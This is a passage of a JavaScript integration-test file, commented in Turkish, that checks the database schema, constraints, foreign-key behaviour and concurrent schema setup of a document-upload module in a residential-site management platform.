// qa_platform_pg.mjs "documents" bolumu (Belgeler, Faz 3b-A; docs/PLATFORM_BELGELER.md Bolum A). GERCEK PostgreSQL + GERCEK dosya sistemi.
// QA_ONLY=documents ile ayri kosulur (qa_platform_pg.mjs bu dosyayi ice aktarir; ortak yardimcilari `ctx` ile verir). `npm test` ICINDE DEGILDIR.
//
// Kapsam: sema (CHECK / indeks / CASCADE / SET NULL, ensureDbSchema idempotans + eksik nesne tamamlama + yazici yuku altinda acilis), yetki matrisi ve modul
// kapisi, yukleme (gercek akis, tur / icerik / boyut kapilari, idempotans, kota rezervasyonu yarislari, surum kurallari), yumusak silme / geri alma / kalici
// silme, sakin gorunurlugu (CANLI: tasinan kaybeder, yeni tasinan gorur), indirme basliklari, silme x indirme yarisi, hesap silme x yukleme yarisi,
// bakim isi (bayat yukleme, saklama suresi, yetim sup. <= 200, DB yokken silmeme, tek calisan), yedek-geri yukleme (documents_fsck), duyuru eki,
// gunluk / audit gizliligi, 3000 daireli sitede olcek + EXPLAIN, kilit sirasi turlari (40P01 = 0).
// R9 duzeltmeleri: C13b-C13d (yukleme yarisi zamanlama kancasi, artik dosya, bayat anlik goruntu), I1b/I8-I11 (depolama kimligi + oran korumalari),
// I4/I4c (gider belgesi = bilinen anahtar), K14-K16 (ek yolu kitle kontrolu + sakin gorunumunde ad maskeleme).
// R16 duzeltmeleri: I1c-I1e (yukleme suresi sunucuda + bakim ONCE satir / belirleyici ara giris), I4e-I4g (yetim KARANTINASI, fsck --restore-quarantine), K8b (yonetici ayrinti ucu
// ek bilgisini korur), K17 (tasinan sakin ek uzerinden indiremez), C8b (etkin icerik iletisi NEDENE gore), C8 OOXML atlatmalari.
// R11 duzeltmeleri: A11b/A11c/A12 (FK'ler ayri ifadeler, eksik FK tamamlama, ters sirali yaziciyla DDL 40P01 = 0), I3/I3b/I3c (dosya COMMIT sonrasi silinir), I4d (gider belgesi 25 saat).
import fsSync, { promises as fsp } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import http from 'node:http';
import {
  EXE_BYTES,
  makeDocx,
  makeJpeg,
  makePdf,
  makePng,
  makeXlsx,
  MACRO_CONTENT_TYPES,
} from '../test/fixtures/document_samples.js';

export async function sectionDocuments(ctx) {
  const { check, same, sleep, childEnv, finishChild, installPoolHooks, serverErrors } = ctx;
  await childEnv();
  process.env.DB_STATEMENT_TIMEOUT_MS = process.env.DB_STATEMENT_TIMEOUT_MS || '120000';
  const storageRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), 'qa-documents-'));
  Object.assign(process.env, {
    DOCUMENTS_DIR: storageRoot,
    DOCUMENTS_MIN_FREE_BYTES: '0',
    DOCUMENTS_MAINTENANCE_DISABLED: '1',
    DOCUMENTS_SITE_QUOTA_BYTES: String(200 * 1048576),
  });
  // gunluk gizliligi (L): console.log / warn de toplanir (console.error childEnv'de toplanir)
  const logLines = [];
  const realLog = console.log;
  const realWarn = console.warn;
  console.warn = (...args) => { logLines.push(args.map(String).join(' ')); };
  // beklenmedik surec cikisinda (islenmeyen hata isleyicisi) son sunucu hata satirlari gorunsun
  process.on('exit', (code) => { if (code !== 0) for (const line of serverErrors.slice(-6)) realLog(`  [cikis oncesi sunucu hatasi] ${line.slice(0, 500)}`); });
  console.log = (...args) => {
    const line = args.map(String).join(' ');
    if (!/^(PASS|FAIL)\s/.test(line)) logLines.push(line);
    realLog(...args);
  };

  const { pool, ensureDbSchema } = await import('../src/db.js');
  const { ensureDocumentsSchema } = await import('../src/modules/document_schema.js');
  const q = (sql, params = []) => pool.query(sql, params);
  const hooks = installPoolHooks(pool);
  const express = (await import('express')).default;
  const { signAccessToken } = await import('../src/jwt.js');
  const { requireSiteManager, requireSuperUser } = await import('../src/middlewares/auth_middleware.js');
  const { documentRouter } = await import('../src/modules/document_routes.js');
  const { announcementRouter } = await import('../src/modules/announcement_routes.js');
  const { moduleRouter } = await import('../src/modules/module_routes.js');
  const { runDocumentsMaintenanceOnce, MAINTENANCE_LOCK } = await import('../src/modules/document_maintenance.js');
  const { runFsck } = await import('./documents_fsck.mjs');
  const { loadAttachments } = await import('../src/modules/document_attachments.js');
  const { resetStorageCheck, pathForKey } = await import('../src/modules/document_storage.js');
  const { performAccountDeletion, accountHooks } = await import('../src/modules/account_deletion_service.js');
  const { collectPersonalData, EXPORT_EXCLUDED } = await import('../src/modules/account_export_service.js');
  const { announcementRouteHooks } = await import('../src/modules/announcement_routes.js');
  announcementRouteHooks.kickEmailQueue = () => {};
  accountHooks.background = () => {};
  accountHooks.rotateTokensForSite = async () => {};
  accountHooks.rotateTokensForDevices = async () => {};
  accountHooks.sendDeletedEmail = async () => {};
  accountHooks.smtpConfigured = () => false;
  resetStorageCheck();

  // --- HTTP: gercek authRequired + gercek JWT; hiz sinirlayicilar devre disi (birim testlerinde sinanir), rol korumalari KALIR
  const keep = new Set([requireSiteManager, requireSuperUser]);
  for (const router of [documentRouter, announcementRouter, moduleRouter]) {
    for (const layer of router.stack) {
      if (!layer.route) continue;
      const stack = layer.route.stack;
      for (let i = 1; i < stack.length - 1; i += 1) {
        if (!keep.has(stack[i].handle)) stack[i].handle = (_req, _res, next) => next();
      }
    }
  }
  const app = express();
  app.use(express.json({ limit: '1mb' }));
  app.use(documentRouter);
  app.use(announcementRouter);
  app.use(moduleRouter);
  const server = await new Promise((resolve) => {
    const s = http.createServer(app);
    s.requestTimeout = 60000;
    s.listen(0, '127.0.0.1', () => resolve(s));
  });
  const base = `http://127.0.0.1:${server.address().port}`;
  const tokens = new Map();
  const tokenFor = async (userCode) => {
    if (!tokens.has(userCode)) {
      const row = (await q(`SELECT user_code AS id, email, role, password_hash FROM users WHERE user_code = $1`, [userCode])).rows[0];
      tokens.set(userCode, signAccessToken({ id: row.id, email: row.email, role: row.role }, { passwordHash: row.password_hash }));
    }
    return tokens.get(userCode);
  };
  async function call(method, urlPath, userCode, body, extraHeaders = {}) {
    const headers = { 'content-type': 'application/json', ...extraHeaders };
    if (userCode !== null) headers.authorization = `Bearer ${await tokenFor(userCode)}`;
    const response = await fetch(`${base}${urlPath}`, { method, headers, body: body === undefined ? undefined : JSON.stringify(body) });
    const raw = Buffer.from(await response.arrayBuffer());
    let json = null;
    try {
      json = JSON.parse(raw.toString('utf8'));
    } catch (_e) {
      // JSON olmayan yanit (indirme)
    }
    return { status: response.status, body: json, raw, headers: response.headers };
  }
  async function rawPut(urlPath, userCode, bytes, headers = {}) {
    const response = await fetch(`${base}${urlPath}`, {
      method: 'PUT',
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${await tokenFor(userCode)}`, ...headers },
      body: bytes,
    });
    let json = null;
    try {
      json = await response.json();
    } catch (_e) {
      // govdesiz
    }
    return { status: response.status, body: json, headers: response.headers };
  }

  const failCode = async (sql, params = []) => {
    try {
      await q(sql, params);
      return null;
    } catch (error) {
      return error.code ?? String(error.message);
    }
  };
  const countOf = async (sql, params = []) => Number((await q(sql, params)).rows[0].n);

  // --- fabrikalar
  let nextUser = 30000;
  const mkUser = async (name, role = 'individual') => {
    nextUser += 1;
    await q(
      `INSERT INTO users (user_code, full_name, email, role, password_hash, is_active, email_verified, approval_status)
       VALUES ($1, $2, $3, $4, 'x', TRUE, TRUE, 'approved')`,
      [nextUser, name, `doc${nextUser}@qa.example`, role],
    );
    return nextUser;
  };
  let nextSite = 1000000700;
  const mkSite = async (name, blocks, { approved = true } = {}) => {
    nextSite += 1;
    const code = nextSite;
    await q(`INSERT INTO sites (site_code, name, approval_status, approved_at) VALUES ($1, $2, $3, CASE WHEN $3 = 'approved' THEN NOW() END)`, [code, name, approved ? 'approved' : 'pending']);
    const apts = [];
    const blockIds = {};
    let order = 0;
    for (const [blockName, count] of Object.entries(blocks)) {
      order += 1;
      const blockId = Number((await q(`INSERT INTO site_blocks (site_code, block_name, sort_order) VALUES ($1, $2, $3) RETURNING id`, [code, blockName, order])).rows[0].id);
      blockIds[blockName] = blockId;
      for (let n = 1; n <= count; n += 1) {
        const id = Number((await q(`INSERT INTO apartments (site_code, block_id, unit_label, sort_order) VALUES ($1, $2, $3, $4) RETURNING id`, [code, blockId, `Daire ${n}`, n])).rows[0].id);
        apts.push({ id, block: blockName, blockId, n, label: `${blockName} - Daire ${n}` });
      }
    }
    return { code, apts, blockIds, apt: (label) => apts.find((a) => a.label === label) };
  };
  const linkManager = (site, user) => q(`INSERT INTO site_manager_sites (site_code, manager_user_code) VALUES ($1, $2)`, [site, user]);
  const addMember = (site, user, role) => q(`INSERT INTO site_memberships (site_code, user_code, role) VALUES ($1, $2, $3)`, [site, user, role]);
  const addPerson = async (site, user, { active = true } = {}) =>
    Number((await q(`INSERT INTO site_people (site_code, user_code, full_name, is_active) VALUES ($1, $2, $3, $4) RETURNING id`, [site, user, user === null ? 'Hesapsiz Kisi' : null, active])).rows[0].id);
  const addResidency = (site, apartment, person, { current = true } = {}) =>
    q(`INSERT INTO apartment_residencies (site_code, apartment_id, person_id, relation, is_current, origin) VALUES ($1, $2, $3, 'resident', $4, 'manual')`, [site, apartment, person, current]);
  const resident = async (site, apartment, name) => {
    const user = await mkUser(name, 'apartment_owner');
    const person = await addPerson(site.code, user);
    await addResidency(site.code, apartment.id, person);
    return { user, person };
  };

  let keyCounter = 0;
  const idemKey = (label = 'k') => `qa-${label}-${(keyCounter += 1)}-${crypto.randomBytes(3).toString('hex')}`;
  const SECRET_TITLE = 'GIZLI-BASLIK-91827';
  const SECRET_FILE = 'GIZLI-DOSYA-ADI-91827';
  const SECRET_NOTE = 'GIZLI-NOT-91827';

  const SUPER = await mkUser('Belge Super', 'super_user');
  const MGR = await mkUser('Belge Yonetici', 'site_manager');
  const MGR2 = await mkUser('Baska Site Yoneticisi', 'site_manager');
  const BOARD = await mkUser('Belge Kurul', 'individual');
  const STAFF = await mkUser('Belge Gorevli', 'individual');
  const OUTSIDER = await mkUser('Belge Ilgisiz', 'individual');

  const site = await mkSite('Belge Sitesi', { 'A Blok': 3, 'B Blok': 3 });
  const site2 = await mkSite('Baska Belge Sitesi', { 'A Blok': 2 });
  await linkManager(site.code, MGR);
  await linkManager(site2.code, MGR2);
  await addMember(site.code, BOARD, 'BOARD_MEMBER');
  await addMember(site.code, STAFF, 'STAFF');

  const base1 = (suffix = '') => `/manager/sites/${site.code}/documents${suffix}`;
  const PDF = makePdf({ padding: 2000 });
  const newDoc = (over = {}, bytes = PDF) => ({
    title: 'Site Yonetmeligi',
    category: 'regulation',
    audience: 'managers',
    file: { name: 'yonetmelik.pdf', size: bytes.length },
    idempotency_key: idemKey('doc'),
    ...over,
  });
  /** olustur + yukle (tek adim); { id, created, uploaded } */
  async function publish(user, over = {}, bytes = PDF, siteCode = site.code) {
    const created = await call('POST', `/manager/sites/${siteCode}/documents`, user, newDoc(over, bytes));
    if (created.status !== 201) return { created, uploaded: null, id: null };
    const uploaded = await rawPut(created.body.upload.path, user, bytes);
    return { created, uploaded, id: created.body.document.id };
  }
  const diskFiles = async (siteCode = site.code) => (await fsp.readdir(path.join(storageRoot, 'sites', String(siteCode))).catch(() => [])).sort();
  const tmpFiles = async () => (await fsp.readdir(path.join(storageRoot, '_tmp')).catch(() => [])).sort();
  /** Bekleyen (uploading) yuklemeleri 3 saat eskitir: kullanici basina 5 bekleyen siniri bolumler arasinda birikmesin (satirlar bakim isi testlerinde silinir). */
  const expirePending = () => q(`UPDATE document_versions SET created_at = NOW() - INTERVAL '3 hours' WHERE status = 'uploading'`);
  const enableModule = (siteCode) => call('PUT', `/manager/sites/${siteCode}/modules/documents`, SUPER, { enabled: true });

  // --- gider belgesi (expense_documents, Faz 4b) yardimcilari: ledger tetikleyicileri ve FK'lar YALNIZ bu baglantida session_replication_role = replica ile atlanir
  const withReplica = async (work) => {
    const connection = await pool.connect();
    try {
      await connection.query(`SET session_replication_role = replica`);
      return await work(connection);
    } finally {
      await connection.query(`RESET session_replication_role`).catch(() => {});
      connection.release();
    }
  };
  /** `count` adet 3 gunluk gider belgesi: diskte dosya (mtime 3 gun once) + expense_documents satiri (document_versions kaydi YOK). */
  const seedExpenseDocs = async (siteCode, count, ageMs = 3 * 86400_000) => {
    const content = 'gider';
    const sha = crypto.createHash('sha256').update(content).digest('hex');
    const dir = path.join(storageRoot, 'sites', String(siteCode));
    await fsp.mkdir(dir, { recursive: true });
    const when = new Date(Date.now() - ageMs);
    const keys = [];
    for (let i = 0; i < count; i += 1) {
      const name = crypto.randomUUID();
      keys.push(`${siteCode}/${name}`);
      await fsp.writeFile(path.join(dir, name), content);
      await fsp.utimes(path.join(dir, name), when, when);
    }
    await withReplica((connection) =>
      connection.query(
        `INSERT INTO expense_documents (site_code, expense_id, status, storage_key, display_name, mime_type, declared_size_bytes, size_bytes, sha256, kind, added_at, completed_at)
         SELECT $1, 900000000 + k.i, 'ready', k.key, 'gider.pdf', 'application/pdf', 5, 5, $2, 'invoice', NOW() - INTERVAL '3 days', NOW() - INTERVAL '3 days'
         FROM unnest($3::text[]) WITH ORDINALITY AS k(key, i)`,
        [siteCode, sha, keys],
      ),
    );
    return keys;
  };
  const dropExpenseDocs = async (keys) => {
    await withReplica((connection) => connection.query(`DELETE FROM expense_documents WHERE storage_key = ANY($1::text[])`, [keys]));
    for (const key of keys) await fsp.rm(path.join(storageRoot, 'sites', key), { force: true });
  };
  const sha256Of = (bytes) => crypto.createHash('sha256').update(bytes).digest('hex');
  /** Ayni boyutta, icerigi `marker` ile ayirt edilen gecerli PDF (marker uzunlugu sabit tutulmali). */
  const markerPdf = (marker) => makePdf({ extra: `/Title (${marker})` });
  const TARGET_QUERY = 'v.declared_size_bytes, v.display_name, v.mime_type, v.uploaded_by';

  // ============================================================================================================
  // A. Sema
  // ============================================================================================================
  console.log('--- A. sema ---');
  const tables = (await q(`SELECT to_regclass('public.documents') AS d, to_regclass('public.document_versions') AS v, to_regclass('public.announcement_attachments') AS a`)).rows[0];
  check('A1: uc tablo var (documents, document_versions, announcement_attachments)', Object.values(tables).every((v) => v !== null), tables);
  const indexDefs = Object.fromEntries((await q(`SELECT indexname, indexdef FROM pg_indexes WHERE schemaname = 'public' AND tablename IN ('documents', 'document_versions', 'announcement_attachments')`)).rows.map((r) => [r.indexname, r.indexdef]));
  check('A2: indeksler: (site_code,status,id DESC), (site_code,category,id DESC) KISMI active, tekil idempotans KISMI, (status,deleted_at) KISMI, kota (site_code), uploading KISMI, FK indeksleri',
    /\(site_code, status, id DESC\)/.test(indexDefs.idx_documents_site_status ?? '') &&
      /\(site_code, category, id DESC\) WHERE \(status = 'active'/.test(indexDefs.idx_documents_site_category ?? '') &&
      /UNIQUE.*\(site_code, created_by, idempotency_key\) WHERE \(idempotency_key IS NOT NULL\)/.test(indexDefs.uq_documents_idempotency ?? '') &&
      /\(status, deleted_at\) WHERE/.test(indexDefs.idx_documents_lifecycle ?? '') &&
      /\(site_code\)/.test(indexDefs.idx_document_versions_site ?? '') &&
      /\(status, created_at\) WHERE \(status = 'uploading'/.test(indexDefs.idx_document_versions_uploading ?? '') &&
      Boolean(indexDefs.idx_documents_created_by && indexDefs.idx_documents_deleted_by && indexDefs.idx_document_versions_uploaded_by && indexDefs.idx_announcement_attachments_document),
    indexDefs);

  const schemaSite = await mkSite('Sema Sitesi', { 'A Blok': 2 });
  const schemaUser = await mkUser('Sema Kullanicisi');
  const insertDoc = (over = {}) => {
    const v = { site_code: schemaSite.code, category: 'other', title: 'T', audience: 'managers', ...over };
    const cols = Object.keys(v);
    return failCode(`INSERT INTO documents (${cols.join(', ')}) VALUES (${cols.map((_, i) => `$${i + 1}`).join(', ')})`, cols.map((c) => v[c]));
  };
  const badDocs = [
    ['gecersiz kategori', { category: 'x' }], ['bos baslik', { title: '' }], ['121 karakterlik baslik', { title: 'x'.repeat(121) }], ['1001 karakterlik aciklama', { description: 'y'.repeat(1001) }],
    ['gecersiz kitle', { audience: 'herkes' }], ['gecersiz hedef turu', { target_type: 'x' }], ['gecersiz durum', { status: 'x' }],
    ['kurul belgesinde blok hedefi', { audience: 'board', target_type: 'blocks', target_block_ids: '{1}' }],
    ['yoneticilere belgede daire hedefi', { audience: 'managers', target_type: 'apartments', target_apartment_ids: '{1}' }],
    ['sakin + blok hedefi ama bos dizi', { audience: 'residents', target_type: 'blocks', target_block_ids: '{}' }],
    ['sakin + site hedefi ama dolu dizi', { audience: 'residents', target_type: 'site', target_block_ids: '{1}' }],
    ['sakin + daire hedefi 501 kimlik', { audience: 'residents', target_type: 'apartments', target_apartment_ids: `{${Array.from({ length: 501 }, (_, i) => i + 1).join(',')}}` }],
    ['blok hedefinde daire kimligi de var', { audience: 'residents', target_type: 'blocks', target_block_ids: '{1}', target_apartment_ids: '{2}' }],
    ['deleted ama deleted_at yok', { status: 'deleted' }], ['active ama deleted_at dolu', { status: 'active', current_version_no: 1, deleted_at: new Date() }],
    ['active ama current_version_no yok', { status: 'active' }], ['65 karakterlik idempotans anahtari', { idempotency_key: 'k'.repeat(65) }],
  ];
  const badDocResults = [];
  for (const [label, over] of badDocs) badDocResults.push([label, await insertDoc(over)]);
  check(`A3: documents CHECK'leri ${badDocs.length} gecersiz kombinasyonu 23514 ile reddeder`, badDocResults.every(([, code]) => code === '23514'), badDocResults.filter(([, c]) => c !== '23514'));
  check('A3b: gecerli satirlar kabul (varsayilan audience en kisitli: managers; durum pending)', (await insertDoc({ audience: 'residents', target_type: 'blocks', target_block_ids: `{${schemaSite.apts[0].blockId}}` })) === null && (await insertDoc({})) === null);
  const defaults = (await q(`SELECT audience, status, version_count, next_version_no, download_count, target_type FROM documents WHERE site_code = $1 AND title = 'T' ORDER BY id DESC LIMIT 1`, [schemaSite.code])).rows[0];
  check('A3c: DB varsayilanlari EN KISITLI (audience managers, status pending, sayaclar 0/1)', same(defaults, { audience: 'managers', status: 'pending', version_count: 0, next_version_no: 1, download_count: '0', target_type: 'site' }), defaults);

  const schemaDoc = Number((await q(`INSERT INTO documents (site_code, category, title, audience) VALUES ($1, 'other', 'Surum Denemesi', 'managers') RETURNING id`, [schemaSite.code])).rows[0].id);
  const insertVersion = (over = {}) => {
    const v = { document_id: schemaDoc, site_code: schemaSite.code, version_no: 1, storage_key: `${schemaSite.code}/${crypto.randomUUID()}`, display_name: 'a.pdf', mime_type: 'application/pdf', declared_size_bytes: 10, size_bytes: 10, ...over };
    const cols = Object.keys(v);
    return failCode(`INSERT INTO document_versions (${cols.join(', ')}) VALUES (${cols.map((_, i) => `$${i + 1}`).join(', ')})`, cols.map((c) => v[c]));
  };
  const badVersions = [
    ['mime izin listesinde degil', { mime_type: 'text/html' }], ['gecersiz durum', { status: 'x' }], ['bildirilen boyut 0', { declared_size_bytes: 0 }], ['negatif boyut', { size_bytes: -1 }],
    ['sha256 biciminde degil', { sha256: 'abc' }], ['ready ama sha256 yok', { status: 'ready', completed_at: new Date() }], ['ready ama completed_at yok', { status: 'ready', sha256: 'a'.repeat(64) }],
    ['gecersiz tarama durumu', { scan_status: 'x' }], ['121 karakterlik ad', { display_name: 'x'.repeat(121) }], ['201 karakterlik not', { note: 'n'.repeat(201) }], ['surum numarasi 0', { version_no: 0 }],
  ];
  const badVersionResults = [];
  for (const [label, over] of badVersions) badVersionResults.push([label, await insertVersion(over)]);
  check(`A4: document_versions CHECK'leri ${badVersions.length} gecersiz kombinasyonu 23514 ile reddeder`, badVersionResults.every(([, code]) => code === '23514'), badVersionResults.filter(([, c]) => c !== '23514'));
  const sharedKey = `${schemaSite.code}/${crypto.randomUUID()}`;
  check('A4b: gecerli surum kabul; ayni storage_key 23505; ayni (belge, surum no) 23505', (await insertVersion({ storage_key: sharedKey })) === null && (await insertVersion({ storage_key: sharedKey, version_no: 2 })) === '23505' && (await insertVersion({ version_no: 1 })) === '23505');
  for (const mime of ['application/pdf', 'image/jpeg', 'image/png', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet']) {
    if ((await insertVersion({ version_no: 10 + Math.floor(Math.random() * 1e6), mime_type: mime })) !== null) check(`A4c: ${mime} kabul edilmedi`, false);
  }
  check('A4c: bes izinli MIME DB duzeyinde kabul edilir', true);

  const attAnn = Number((await q(`INSERT INTO announcements (site_code, title, body) VALUES ($1, 'Ek denemesi', 'metin') RETURNING id`, [schemaSite.code])).rows[0].id);
  check('A5: announcement_attachments: gecerli satir; ayni (duyuru, belge) 23505; position 5 23514', (await failCode(`INSERT INTO announcement_attachments (announcement_id, document_id, position) VALUES ($1, $2, 0)`, [attAnn, schemaDoc])) === null &&
    (await failCode(`INSERT INTO announcement_attachments (announcement_id, document_id, position) VALUES ($1, $2, 1)`, [attAnn, schemaDoc])) === '23505' &&
    (await failCode(`INSERT INTO announcement_attachments (announcement_id, document_id, position) VALUES ($1, $2, 5)`, [attAnn, schemaDoc])) === '23514');
  await q(`DELETE FROM documents WHERE id = $1`, [schemaDoc]);
  check('A6: belge silinince surumleri ve duyuru ekleri CASCADE ile gider', (await countOf(`SELECT COUNT(*)::int AS n FROM document_versions WHERE document_id = $1`, [schemaDoc])) === 0 && (await countOf(`SELECT COUNT(*)::int AS n FROM announcement_attachments WHERE document_id = $1`, [schemaDoc])) === 0);
  const fkDoc = Number((await q(`INSERT INTO documents (site_code, category, title, audience, created_by) VALUES ($1, 'other', 'FK', 'managers', $2) RETURNING id`, [schemaSite.code, schemaUser])).rows[0].id);
  await q(`INSERT INTO document_versions (document_id, site_code, version_no, storage_key, display_name, mime_type, declared_size_bytes, size_bytes, uploaded_by) VALUES ($1, $2, 1, $3, 'a.pdf', 'application/pdf', 5, 5, $4)`, [fkDoc, schemaSite.code, `${schemaSite.code}/${crypto.randomUUID()}`, schemaUser]);
  await q(`DELETE FROM users WHERE user_code = $1`, [schemaUser]);
  const afterUserDelete = (await q(`SELECT d.created_by, (SELECT uploaded_by FROM document_versions WHERE document_id = d.id LIMIT 1) AS uploaded_by FROM documents d WHERE d.id = $1`, [fkDoc])).rows[0];
  check('A7: kullanici KALICI silinince belge ve surum kalir, created_by / uploaded_by NULL (ON DELETE SET NULL)', afterUserDelete && afterUserDelete.created_by === null && afterUserDelete.uploaded_by === null, afterUserDelete);
  const cascadeSite = await mkSite('Cascade Sitesi', { 'A Blok': 1 });
  await q(`INSERT INTO documents (site_code, category, title, audience) VALUES ($1, 'other', 'C', 'managers')`, [cascadeSite.code]);
  await q(`DELETE FROM sites WHERE site_code = $1`, [cascadeSite.code]);
  check('A8: site silinince belgeleri CASCADE ile gider', (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE site_code = $1`, [cascadeSite.code])) === 0);

  // A9: ensureDbSchema
  hooks.log = [];
  await ensureDbSchema();
  await ensureDbSchema();
  const ddlTouching = hooks.log.filter((entry) => /(CREATE|ALTER)\s/i.test(entry.text ?? '') && /\b(documents|document_versions|announcement_attachments)\b/.test(entry.text ?? ''));
  hooks.log = null;
  check('A9: ensureDbSchema x2 (nesneler varken) belge tablolarina HICBIR CREATE / ALTER ifadesi gondermez (kilit almaz; acilis 40P01 dersi)', ddlTouching.length === 0, ddlTouching.map((e) => String(e.text).slice(0, 80)));
  await q(`DROP INDEX idx_documents_lifecycle`);
  await q(`DROP INDEX idx_announcement_attachments_document`);
  hooks.log = [];
  await ensureDbSchema();
  const recreated = hooks.log.filter((entry) => /CREATE/i.test(entry.text ?? '') && /\b(documents|document_versions|announcement_attachments)\b/.test(entry.text ?? '')).map((e) => String(e.text).replace(/\s+/g, ' ').slice(0, 90));
  hooks.log = null;
  const idxNow = new Set((await q(`SELECT indexname FROM pg_indexes WHERE schemaname = 'public'`)).rows.map((r) => r.indexname));
  check('A10: eksik indeks yeniden olusturulur ve YALNIZ eksik olanlar icin ifade gonderilir', idxNow.has('idx_documents_lifecycle') && idxNow.has('idx_announcement_attachments_document') && recreated.length === 2, recreated);
  const catalogBefore = JSON.stringify((await q(`SELECT table_name, column_name, data_type, is_nullable, column_default FROM information_schema.columns WHERE table_name IN ('documents', 'document_versions', 'announcement_attachments') ORDER BY 1, 2`)).rows);
  const constraintsBefore = JSON.stringify((await q(`SELECT conrelid::regclass::text AS tbl, conname, pg_get_constraintdef(oid) AS def FROM pg_constraint WHERE conrelid::regclass::text IN ('documents', 'document_versions', 'announcement_attachments') ORDER BY 1, 2`)).rows);
  await q(`DROP TABLE announcement_attachments`);
  await q(`DROP TABLE document_versions`);
  await q(`DROP TABLE documents CASCADE`);
  await ensureDbSchema();
  const catalogAfter = JSON.stringify((await q(`SELECT table_name, column_name, data_type, is_nullable, column_default FROM information_schema.columns WHERE table_name IN ('documents', 'document_versions', 'announcement_attachments') ORDER BY 1, 2`)).rows);
  const constraintsAfter = JSON.stringify((await q(`SELECT conrelid::regclass::text AS tbl, conname, pg_get_constraintdef(oid) AS def FROM pg_constraint WHERE conrelid::regclass::text IN ('documents', 'document_versions', 'announcement_attachments') ORDER BY 1, 2`)).rows);
  check('A11: uc tablo da silinirse ensureDbSchema hepsini AYNI sema ile yeniden kurar (sutunlar + kisitlar)', catalogBefore === catalogAfter && constraintsBefore === constraintsAfter);
  const fkRows = async () => (await q(`SELECT conrelid::regclass::text AS tbl, conname, pg_get_constraintdef(oid) AS def FROM pg_constraint WHERE contype = 'f' AND conrelid::regclass::text IN ('documents', 'document_versions', 'announcement_attachments') ORDER BY 1, 2`)).rows;
  const expectedFks = new Map([
    ['documents.documents_site_code_fkey', 'FOREIGN KEY (site_code) REFERENCES sites(site_code) ON DELETE CASCADE'],
    ['documents.documents_created_by_fkey', 'FOREIGN KEY (created_by) REFERENCES users(user_code) ON DELETE SET NULL'],
    ['documents.documents_deleted_by_fkey', 'FOREIGN KEY (deleted_by) REFERENCES users(user_code) ON DELETE SET NULL'],
    ['document_versions.document_versions_document_id_fkey', 'FOREIGN KEY (document_id) REFERENCES documents(id) ON DELETE CASCADE'],
    ['document_versions.document_versions_site_code_fkey', 'FOREIGN KEY (site_code) REFERENCES sites(site_code) ON DELETE CASCADE'],
    ['document_versions.document_versions_uploaded_by_fkey', 'FOREIGN KEY (uploaded_by) REFERENCES users(user_code) ON DELETE SET NULL'],
    ['announcement_attachments.announcement_attachments_announcement_id_fkey', 'FOREIGN KEY (announcement_id) REFERENCES announcements(id) ON DELETE CASCADE'],
    ['announcement_attachments.announcement_attachments_document_id_fkey', 'FOREIGN KEY (document_id) REFERENCES documents(id) ON DELETE CASCADE'],
  ]);
  const fkNow = new Map((await fkRows()).map((row) => [`${row.tbl}.${row.conname}`, row.def]));
  check('A11b (R11 F1): 8 yabanci anahtar AYRI ifadelerle kuruldu; adlari satir ici adlarla (<tablo>_<sutun>_fkey) AYNI, tanimlari beklenen (ON DELETE dahil)', fkNow.size === 8 && [...expectedFks].every(([key, def]) => fkNow.get(key) === def), [...fkNow]);
  await q(`ALTER TABLE document_versions DROP CONSTRAINT document_versions_site_code_fkey`);
  await q(`ALTER TABLE announcement_attachments DROP CONSTRAINT announcement_attachments_announcement_id_fkey`);
  hooks.log = [];
  await ensureDbSchema();
  const fkSent = hooks.log
    .filter((entry) => /ADD CONSTRAINT/.test(entry.text ?? '') && /\b(documents|document_versions|announcement_attachments)\b/.test(entry.text ?? ''))
    .map((entry) => /ADD CONSTRAINT (\w+)/.exec(entry.text)?.[1])
    .sort();
  const tablesRecreated = hooks.log.filter((entry) => /CREATE TABLE/.test(entry.text ?? '') && /\b(documents|document_versions|announcement_attachments)\b/.test(entry.text ?? '')).length;
  hooks.log = null;
  const fkRestored = new Map((await fkRows()).map((row) => [`${row.tbl}.${row.conname}`, row.def]));
  check('A11c (R11 F1): tablo var ama FK eksik (tablo ile FK arasinda surec coktu) -> YALNIZ eksik 2 FK tamamlanir (CREATE TABLE yok), tanimlar ayni',
    same(fkSent, ['announcement_attachments_announcement_id_fkey', 'document_versions_site_code_fkey']) && tablesRecreated === 0 && fkRestored.size === 8 && [...expectedFks].every(([key, def]) => fkRestored.get(key) === def), { fkSent, tablesRecreated });

  // A12: yazici yuku altinda ilk kurulum (tablolar yokken) 40P01 = 0 ve hata yok
  {
    const writerPool = new (await import('pg')).default.Pool({ host: process.env.DB_HOST, port: Number(process.env.DB_PORT), user: process.env.DB_USER, password: process.env.DB_PASSWORD || undefined, database: process.env.DB_NAME, max: 8 });
    const wUsers = [];
    for (let i = 0; i < 8; i += 1) wUsers.push(await mkUser(`Yazici ${i}`));
    const stats = { ops: 0, errors: {} };
    let running = false;
    const loops = [];
    const wtx = async (fn) => {
      const c = await writerPool.connect();
      try {
        await c.query('BEGIN');
        await fn(c);
        await c.query('COMMIT');
        stats.ops += 1;
      } catch (error) {
        await c.query('ROLLBACK').catch(() => {});
        stats.errors[error.code ?? error.message.slice(0, 30)] = (stats.errors[error.code ?? error.message.slice(0, 30)] ?? 0) + 1;
      } finally {
        c.release();
      }
    };
    const mixes = [
      // gercek akislarla AYNI kilit sirasi (sites -> users)
      (u) => wtx(async (c) => { await c.query(`UPDATE sites SET name = name WHERE site_code = $1`, [site.code]); await c.query(`UPDATE users SET full_name = full_name WHERE user_code = $1`, [u]); }),
      (u) => wtx(async (c) => { await c.query(`UPDATE users SET full_name = full_name WHERE user_code = $1`, [u]); }),
      (_u) => wtx(async (c) => { const r = await c.query(`INSERT INTO announcements (site_code, title, body) VALUES ($1, 'yuk', 'yuk') RETURNING id`, [site.code]); await c.query(`UPDATE announcements SET title = 'yuk2' WHERE id = $1`, [r.rows[0].id]); }),
      // R11 F1: TERS sirali yazici (users -> sites). Satir ici REFERENCES'li eski DDL bununla 40P01 uretiyordu; yazicilarin KENDI aralarindaki cakismalari writerPool'da
      // (havuz hook'unun disinda) kalir, hooks.deadlocks YALNIZ DDL istemcisindeki 40P01'leri sayar.
